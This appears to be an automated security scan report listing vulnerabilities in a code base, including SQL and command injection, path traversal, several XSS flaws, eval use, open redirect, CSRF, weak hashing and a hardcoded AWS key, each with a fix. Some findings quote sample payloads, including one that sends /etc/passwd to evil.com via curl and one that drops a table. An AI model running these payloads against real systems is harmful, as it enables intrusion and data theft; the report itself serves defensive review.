summary: Security scan completed. See the findings table below for details.

findings.title: SQL Injection in get_user_unsafe()
findings.description: User input is directly interpolated into the SQL query using f-string without parameterization, allowing attackers to inject arbitrary SQL code (e.g., ' OR '1'='1).
findings.recommendation: Use parameterized queries or prepared statements to safely bind user inputs.

findings.title: SQL Injection in search_products()
findings.description: User input is directly interpolated into the SQL query using f-string without parameterization, allowing SQL injection via crafted payloads (e.g., UNION SELECT).
findings.recommendation: Use parameterized queries or prepared statements to safely bind user inputs.

findings.title: SQL Injection in delete_record()
findings.description: User input concatenated directly into SQL query string allows injection attacks such as stacked queries (e.g., '; DROP TABLE users--'). No type checking is performed.
findings.recommendation: Use parameterized queries and validate input types before execution.

findings.title: Command Injection in ping_host()
findings.description: User input is passed directly into a shell command with shell=True, enabling command injection (e.g., '8.8.8.8; cat /etc/passwd').
findings.recommendation: Avoid shell=True or sanitize and validate inputs strictly; use subprocess.run with a list of arguments instead.

findings.title: Command Injection in run_report()
findings.description: User input is interpolated directly into an os.system call, allowing arbitrary command injection (e.g., 'report; curl http://evil.com/$(cat /etc/passwd)').
findings.recommendation: Avoid os.system with unsanitized input; use subprocess with argument list or validate and sanitize report_name input thoroughly.

findings.title: Command Injection and Path Traversal in list_files()
findings.description: User input is concatenated into a shell command executed via os.popen, enabling command injection and path traversal (e.g., '../../etc').
findings.recommendation: Avoid using os.popen with unsanitized input. Use safer APIs like os.listdir with strict input validation or subprocess with argument list.

findings.title: Path Traversal in read_file()
findings.description: Filename input is joined to a base directory without sanitization, allowing attackers to traverse directories and read arbitrary files (e.g., '../../etc/passwd').
findings.recommendation: Sanitize and validate filename inputs to prevent '..' segments or restrict access using whitelisting or chroot mechanisms.

findings.title: Hardcoded AWS Access Key ID
findings.description: AWS IAM access key ID is hardcoded in the source code, which risks exposure of AWS credentials.
findings.recommendation: Use environment variables or secure secret management solutions for AWS credentials.

findings.title: Weak hashing algorithms for password and token storage
findings.location: def hash_password_md5; def hash_password_sha1; def store_token
findings.description: The code uses MD5 and SHA-1 for hashing passwords, which are cryptographically broken and deprecated algorithms. Additionally, base64 encoding is used for storing tokens, which is not a secure encryption method and gives a false sense of security.
findings.recommendation: Use a modern password hashing function such as Argon2, bcrypt, or PBKDF2 with a salt. For token storage, use strong encryption or secure storage mechanisms rather than simple encoding.

findings.title: DOM-Based XSS via innerHTML in renderUserProfile
findings.description: User input 'userName' is directly injected into innerHTML without sanitization, allowing arbitrary HTML/JavaScript injection and leading to DOM-based XSS.
findings.recommendation: Use safe methods like textContent or proper sanitization libraries to escape user input before rendering.

findings.title: DOM-Based XSS via document.write in displaySearchResults
findings.description: User-controlled input 'query' is used directly inside document.write without sanitization, enabling DOM-based XSS attacks.
findings.recommendation: Avoid using document.write with unsanitized user input. Use safer DOM manipulation methods or sanitize inputs rigorously.

findings.title: DOM-Based XSS via innerHTML using location.hash in updateGreeting
findings.description: Untrusted data from location.hash is injected into innerHTML without any sanitization, allowing attackers to craft URLs that trigger XSS.
findings.recommendation: Escape or sanitize input from the URL fragment before injecting into the DOM, or use safer DOM text methods.

findings.title: Reflected XSS in Express route /search via query parameter
findings.description: The query parameter 'q' is directly reflected inside HTML response without encoding or sanitization, leading to reflected XSS.
findings.recommendation: Properly escape or sanitize user inputs before rendering in responses. Use templating engines with auto-escaping enabled.

findings.title: Reflected XSS in Express route /user/:name via path parameter
findings.description: Path parameter 'name' is rendered directly in HTML without output encoding, allowing reflected XSS attacks.
findings.recommendation: Always encode or sanitize user-supplied path parameters before rendering in HTML.

findings.title: Stored XSS via localStorage and innerHTML in saveAndDisplayComment
findings.description: User input 'comment' is stored in localStorage and then injected into innerHTML without sanitization. Malicious scripts can persist and execute on page load.
findings.recommendation: Sanitize or encode stored content before rendering, or avoid using innerHTML for untrusted data.

findings.title: Insecure eval() usage on user input in processUserFormula
findings.description: Using eval() on user input allows arbitrary code execution, leading to severe security risks including injection attacks and full environment compromise.
findings.recommendation: Avoid eval(). Use safe parsers or sandboxed environments to process user formulas.

findings.title: Insecure Function constructor usage on user input in loadConfig
findings.description: Constructing functions from user-supplied strings with Function() is equivalent to eval and allows arbitrary code execution.
findings.recommendation: Avoid dynamic code evaluation. Parse configuration data securely using structured formats like JSON.

findings.title: Open Redirect via unvalidated url parameter in /redirect route
findings.description: Redirect target URL is taken directly from query parameter 'url' without validation. This enables phishing attacks via open redirect.
findings.recommendation: Validate and whitelist redirect targets to prevent redirects to arbitrary external sites.

findings.title: CSRF vulnerability due to missing CSRF token in /transfer POST route
findings.description: The /transfer endpoint processes sensitive state-changing operations without validating CSRF tokens, allowing attackers to perform unauthorized actions via CSRF.
findings.recommendation: Implement CSRF protection mechanisms such as synchronizer tokens, double submit cookies, or use middleware provided by frameworks.
